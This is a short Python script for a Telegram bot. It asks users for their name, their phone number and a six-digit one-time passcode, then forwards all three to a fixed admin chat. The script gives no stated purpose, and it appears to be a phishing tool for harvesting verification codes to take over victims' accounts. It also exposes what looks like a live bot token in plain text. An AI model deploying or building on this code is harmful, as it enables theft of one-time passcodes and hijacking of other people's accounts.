import telebot

# Set up the bot and admin chat ID
TOKEN = '<6093716720:AAHJfYDCUgYcGAp7evIiiPdk54EEGTt1GDY>'
bot = telebot.TeleBot("6093716720:AAHJfYDCUgYcGAp7evIiiPdk54EEGTt1GDY")
admin_chat_id = '<5461700254>'

# Dictionary to store user data
user_data = {}

# Handler for /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to the bot. Please enter your name:")
    user_data[message.chat.id] = {'name': None, 'phone_number': None, 'otp': None}

# Handler for user's name input
@bot.message_handler(func=lambda message: user_data[message.chat.id]['name'] is None)
def get_name(message):
    user_data[message.chat.id]['name'] = message.text
    bot.reply_to(message, "Please enter your phone number (with country code):")

# Handler for user's phone number input
@bot.message_handler(func=lambda message: user_data[message.chat.id]['phone_number'] is None)
def get_phone_number(message):
    user_data[message.chat.id]['phone_number'] = message.text
    bot.reply_to(message, "Please enter the 6 digit OTP:")

# Handler for user's OTP input
@bot.message_handler(func=lambda message: user_data[message.chat.id]['otp'] is None)
def get_otp(message):
    user_data[message.chat.id]['otp'] = message.text
    bot.reply_to(message, "Thank you for providing the information.")
    # Send the user's data to the admin
    admin_message = f"User {user_data[message.chat.id]['name']} ({message.chat.id}) has provided the following information:\nPhone number: {user_data[message.chat.id]['phone_number']}\nOTP: {user_data[message.chat.id]['otp']}"
    bot.send_message(admin_chat_id, admin_message)

# Handler for all other messages
@bot.message_handler(func=lambda message: True)
def handle_other_messages(message):
    bot.reply_to(message, "Please enter your name first.")

# Start the bot
bot.polling()
